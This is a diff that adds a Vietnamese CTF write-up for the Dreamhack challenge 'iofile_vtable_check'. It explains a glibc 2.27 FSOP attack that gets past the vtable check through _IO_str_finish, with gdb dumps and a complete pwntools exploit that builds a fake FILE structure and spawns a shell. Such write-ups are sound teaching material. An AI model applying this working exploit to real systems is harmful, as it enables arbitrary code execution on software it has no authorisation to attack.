@@ -2356,3 +2356,177 @@ p.sendafter(b'# ',pl3)
 
 p.interactive()
 ```
+
+## iofile_vtable_check
+
+
+- checksec: 
+
+```c
+ploi@PhuocLoiiiii:~/pwn/FSOP/iofile_vtable_check$ checksec iofile_vtable_check
+[*] '/home/ploi/pwn/FSOP/iofile_vtable_check/iofile_vtable_check'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+- main : bài rất ngắn , ta thấy đầu tiên ta sẽ được leak sẵn 1 địa chỉ libc, tiếp sau đó là input vào `fp` , `fp` ở đây là 1 con trỏ file , tiếp theo nó check `fp[1]._IO_read_ptr` và đóng `fd` 
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  initialize(argc, argv, envp);
+  fp = fopen("/dev/urandom", "r");
+  printf("stdout: %p\n", stdout);
+  printf("Data: ");
+  read(0, fp, 300uLL);
+  if ( fp[1]._IO_read_ptr )
+    exit(0);
+  fclose(fp);
+  return 0;
+}
+```
+
+- nhìn qua thì ta sẽ nghĩ ngay đến `fsop` , ta được input 300 bytes vào `fd` , libc ở bài này là 2.27 -> nó sẽ có `vtable check`  , vậy bài này ta sẽ cần phải vượt qua nó , sau khi tìm kiếm thì ta có thể thấy cái này [_IO_str_overflow](https://ptr-yudai.hatenablog.com/entry/2019/02/12/000202)  và ta cần ghi `_s._allocate_buffer` thành system nhưng bài này nó đã check vì vậy ta cần tìm cách khác , ta sẽ tấn công `_IO_str_finish()`  [here](https://lactea.kr/entry/pwnable-glibc-224-%EC%9D%B4%EC%83%81-%EB%B2%84%EC%A0%84%EC%97%90%EC%84%9C-IOFILE-vtable-check-bypss#_io_str_finish-_io_validate_vtable-byass)
+
+
+ta thấy ở dòng thứ 4 nó sẽ thực thi hàm trong ` _s._free_buffer`  với giá trị `fp->_IO_buf_base` làm đối số và ta cũng cần vượt qua các điều kiện ở trên  
+```c
+void _IO_str_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
+    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
+  fp->_IO_buf_base = NULL;
+
+  _IO_default_finish (fp, 0);
+}
+```
+
+- ta cần setup `fp->_IO_buf_base`  và  `fp->_flags & _IO_USER_BUF`  , về `fp-flags` thì ta chỉ cần đặt nó thành 0 -> bên trong () sẽ là 0  và !0 = 1 , vì vậy ta hoàn toàn có bypass qua đoạn này 
+- tiếp theo là ` _s._free_buffer `  Trong ((_IO_strfile *) fp)->_s._free_buffer, fp đã được ép kiểu về cấu trúc _IO_strfile, và _s đã được gọi từ cấu trúc đã thay đổi. Cấu trúc của _IO_strfile như sau.
+
+```c
+typedef struct _IO_strfile_
+{
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;
+} _IO_strfile;
+```
+
+- Bên trong cấu trúc, _s được khai báo là _IO_str_fields. Vậy chúng ta hãy xem _IO_str_fields này
+
+```c
+struct _IO_str_fields
+{
+  _IO_alloc_type _allocate_buffer;
+  _IO_free_type _free_buffer;
+};
+```
+
+- ta có thể sẽ thấy `_allocate_buffer` khá là quen thuộc , nó được sử dụng cho `_io_str_overflow` nó sẽ được overwrite bằng system của ta , tuy nhiên như đã nói thì bài này chặn việc đó rồi 
+- và khi ta sử dụng `_IO_str_finish`, địa chỉ hàm system sẽ được đặt vào phần `_free_buffer` đây là phần  nằm sau `_allocate_buffer`. Vì vậy, chúng ta đưa 0 vào phần 0xe0 và địa chỉ hàm system vào phần tiếp theo.
+
+
+- okay tất cả đã được thiết lập , vì vậy trước hết ta cần thực thi `str_finish` của `_IO_str_jumps` thông qua fake vtable . 1 điều may mắn là struct `_IO_str_jumps` và struct `_IO_file_jumps` là giống nhau -> offset cũng giống nhau , Và vị trí của cấu trúc _IO_str_jumps nằm ở +0xc0 trong _IO_file_jumps. Vì cấu trúc _IO_str_jumps không hiển thị trong gdb, nên mình tìm hiểu được rằng chỉ cần cộng +0xc0 vào _IO_file_jumps.
+
+```css
+pwndbg> p &_IO_file_jumps
+$11 = (<data variable, no debug info> *) 0x7ff0129e82a0 <_IO_file_jumps>
+pwndbg> x/32gx 0x7ff0129e82a0
+0x7ff0129e82a0 <_IO_file_jumps>:        0x0000000000000000      0x0000000000000000
+0x7ff0129e82b0 <_IO_file_jumps+16>:     0x00007ff01268c330      0x00007ff01268d300
+0x7ff0129e82c0 <_IO_file_jumps+32>:     0x00007ff01268d020      0x00007ff01268e3c0
+0x7ff0129e82d0 <_IO_file_jumps+48>:     0x00007ff01268fc50      0x00007ff01268b930
+0x7ff0129e82e0 <_IO_file_jumps+64>:     0x00007ff01268b590      0x00007ff01268ab90
+0x7ff0129e82f0 <_IO_file_jumps+80>:     0x00007ff01268e990      0x00007ff01268a850
+0x7ff0129e8300 <_IO_file_jumps+96>:     0x00007ff01268a6d0      0x00007ff01267e100
+0x7ff0129e8310 <_IO_file_jumps+112>:    0x00007ff01268b910      0x00007ff01268b190
+0x7ff0129e8320 <_IO_file_jumps+128>:    0x00007ff01268a910      0x00007ff01268a840
+0x7ff0129e8330 <_IO_file_jumps+144>:    0x00007ff01268b180      0x00007ff01268fdd0
+0x7ff0129e8340 <_IO_file_jumps+160>:    0x00007ff01268fde0      0x0000000000000000
+
+pwndbg> x/32gx 0x7ff0129e82a0+0xc0
+0x7ff0129e8360: 0x0000000000000000      0x0000000000000000
+0x7ff0129e8370: 0x00007ff012690300      0x00007ff01268ff60
+0x7ff0129e8380: 0x00007ff01268ff00      0x00007ff01268e3c0
+0x7ff0129e8390: 0x00007ff0126902e0      0x00007ff01268e420
+0x7ff0129e83a0: 0x00007ff01268e5d0      0x00007ff012690430
+0x7ff0129e83b0: 0x00007ff01268e990      0x00007ff01268e860
+0x7ff0129e83c0: 0x00007ff01268ec50      0x00007ff01268ea00
+0x7ff0129e83d0: 0x00007ff01268fdb0      0x00007ff01268fdc0
+0x7ff0129e83e0: 0x00007ff01268fd90      0x00007ff01268ec50
+0x7ff0129e83f0: 0x00007ff01268fda0      0x00007ff01268fdd0
+0x7ff0129e8400: 0x00007ff01268fde0      0x0000000000000000
+```
+
+- vậy đơn giản là ta sẽ overwrite vtable bằng `0xc0+_IO_file_jumps` và địa chỉ chứa /bin/sh vào  `_IO_buf_base`
+
+- ta thấy bây giờ nó sẽ gọi `_IO_str_finish` 
+
+![here](/assets/images/ioo.png)
+
+- và nó thực thi system('/bin/sh')
+
+![here](/assets/images/iooo.png)
+
+exp:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./iofile_vtable_check_patched")
+libc = ELF("./libc.so.6")
+
+context.binary = exe
+
+p = process()
+#p =  remote('host3.dreamhack.games', 10352)
+
+#p.recvuntil(b'stdout: ')
+#libc.address = int(p.recvline()[:-1],16) - libc.sym._IO_2_1_stdout_
+#log.info(f'libc: {hex(libc.address)}')
+#system = libc.sym.system
+#binsh = next(libc.search(b'/bin/sh\x00'))
+#fake_vtable = libc.address + libc.sym['_IO_file_jumps']+0xc0
+#fp = exe.sym.fp
+
+p.recvuntil(b"stdout: ")
+stdout = int(p.recvuntil(b"\n")[:-1], 16)
+libc_base = stdout-libc.sym['_IO_2_1_stdout_']
+system = libc_base+libc.sym['system']
+fp = exe.sym['fp']
+binsh = libc_base+list(libc.search(b"/bin/sh"))[0]
+fake_vtable = libc_base + libc.sym['_IO_file_jumps']+0xc0
+input()
+
+payload = p64(0x0) # flags
+payload += p64(0x0) # _IO_read_ptr
+payload += p64(0x0) # _IO_read_end
+payload += p64(0x0) # _IO_read_base
+payload += p64(0x0) # _IO_write_base
+payload += p64(0) # _IO_write_ptr
+payload += p64(0x0) # _IO_write_end
+payload += p64(binsh) # _IO_buf_base
+payload += p64(0) # _IO_buf_end
+payload += p64(0x0) # _IO_save_base
+payload += p64(0x0) # _IO_backup_base
+payload += p64(0x0) # _IO_save_end
+payload += p64(0x0) # _IO_marker
+payload += p64(0x0) # _IO_chain
+payload += p64(0x0) # _fileno
+payload += p64(0x0) # _old_offset
+payload += p64(0x0)
+payload += p64(fp + 0x80) # _lock
+payload += p64(0x0)*9
+payload += p64(fake_vtable) # io_file_jump overwrite
+payload += p64(0)
+payload += p64(system)
+
+p.sendafter(b'Data: ',payload)
+p.interactive()
+```
